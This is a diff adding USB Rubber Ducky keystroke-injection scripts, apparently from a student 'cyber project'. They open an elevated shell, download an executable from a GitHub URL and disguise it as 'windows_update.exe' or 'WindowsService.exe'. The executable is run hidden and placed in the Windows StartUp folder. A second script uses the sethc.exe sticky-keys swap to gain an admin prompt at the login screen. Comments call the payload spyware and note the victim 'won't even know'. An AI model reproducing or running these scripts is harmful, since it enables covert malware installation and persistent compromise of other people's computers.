@@ -1,0 +1,164 @@
+REM ducky script for downloading a file from github and executing it as a process assuming that the user is an admin
+
+GUI r
+DELAY 200
+STRING powershell  Start-Process cmd -Verb RunAs
+ENTER
+DELAY 3500
+ALT y
+DELAY 400
+STRING cd "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
+ENTER 
+DELAY 100
+STRING powershell
+ENTER
+DELAY 400
+STRING $wc=New-Object System.Net.Webclient
+ENTER
+DELAY 100
+STRING $wc.DownloadFile("https://github.com/smallmacy/Cyber_Project/raw/master/14Oct2018.exe","windows_update.exe")
+ENTER
+DELAY 5000
+STRING Start-Process "windows_update.exe" -WindowStyle Hidden
+ENTER
+DELAY 200
+STRING exit
+ENTER
+DELAY 100
+STRING exit
+ENTER
+
+REM the program is running as a process!
+
+
+
+
+
+
+
+
+
+
+
+
+
+REM RUBBER DUCKEY code to access cmd with admin privilages and downloading spyware
+REM should check if the restart method also works with "cmd" instead of "System image recovery"
+REM If suggestion works could save time and many lines of code
+
+REM the only flaw so far is that I have to maually shut down and turn on instead of keyboard
+REM Part 1: getting the cmd with admin privilages o login screen
+REM Before I insert the rubber ducky, I shut down the computer and turn on again, but for 2 times I force shut 
+REM down before the startup window finishes loading, On the third time I will have forced the computer to safe mode.
+REM this is the part navigated in safe mode, where I insert the rubber ducky. 
+TAB
+ENTER
+DELAY 1000
+
+REM go to troubleshoot
+
+TAB
+ENTER
+DELAY 1000
+
+REM choose advanced options
+
+TAB
+ENTER
+DELAY
+
+REM choose Command Prompt - 2 Tabs	
+
+TAB
+TAB
+ENTER
+DELAY 1000
+
+REM In the command Prompt, you need to find file sethc.exe in order to change it to cmd
+REM The rubber ducky will search and try multiple dirves in order to change the file name
+REM first, it will try C:
+
+STRING C:
+ENTER
+DELAY 100
+STRING ren C:/Windows/system32/sethc.exe C:/Windows/system32/sethc1.exe
+ENTER
+DELAY 200
+STRING ren C:/Windows/system32/cmd.exe C:/Windows/system32/sethc.exe
+ENTER 
+DELAY 200 
+
+REM If not C: then D:
+
+STRING D:
+ENTER
+DELAY 100
+STRING ren C:/Windows/system32/sethc.exe C:/Windows/system32/sethc1.exe
+ENTER
+DELAY 100
+STRING ren C:/Windows/system32/cmd.exe C:/Windows/system32/sethc.exe
+ENTER 
+DELAY 100
+
+REM If not D: then E:
+
+STRING E:
+ENTER
+DELAY 100
+STRING ren C:/Windows/system32/sethc.exe C:/Windows/system32/sethc1.exe
+ENTER
+DELAY 200
+STRING ren C:/Windows/system32/cmd.exe C:/Windows/system32/sethc.exe
+ENTER 
+DELAY 200
+
+REM finally it will try F:
+
+STRING F:
+ENTER
+DELAY 100
+STRING ren C:/Windows/system32/sethc.exe C:/Windows/system32/sethc1.exe
+
+DELAY 200
+STRING ren C:/Windows/system32/cmd.exe C:/Windows/system32/sethc.exe
+ENTER 
+DELAY 200
+
+REM in 99.9999999% of the time it will be enough
+REM Now it will exit cmd and return to screen
+
+REM there you go! cmd with admin access!
+REM Next part is to open powershell, download the malware and copy it to a specific file that will auto run
+REM as soon as the user logs on
+STRING powershell
+ENTER
+DELAY 100
+STRING $wc=New-Object System.Net.Webclient
+ENTER
+DELAY 100
+REM downlaoding file to desktop
+STRING $wc.DownloadFile("https://github.com/smallmacy/Cyber_Project/raw/master/14Oct2018.exe", "Desktop/demo.exe")
+ENTER
+DELAY 400
+STRING $o = "C:/Users/%UserNameOfVictim%/Desktop"
+ENTER
+DELAY 100
+STRING $c = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsService.exe"
+ENTER
+DELAY 100
+STRING Copy-Item $O -destination $c
+ENTER
+DELAY 200
+REM exiting powershell and cmd
+STRING exit
+ENTER
+DELAY 100
+STRING exit
+ENTER
+DELAY 100
+REM There we have it! A full rubber ducky script that inkects an executable file with malicious code
+REM and executes it when the user logs on
+REM Best of all- user won't even know that he was hacked! It's all from login screen
+REM NOTE!!! You will have to restart the computer in order for the directory StartUp will recognize the file 
+REM as part of its automated tasks.
+
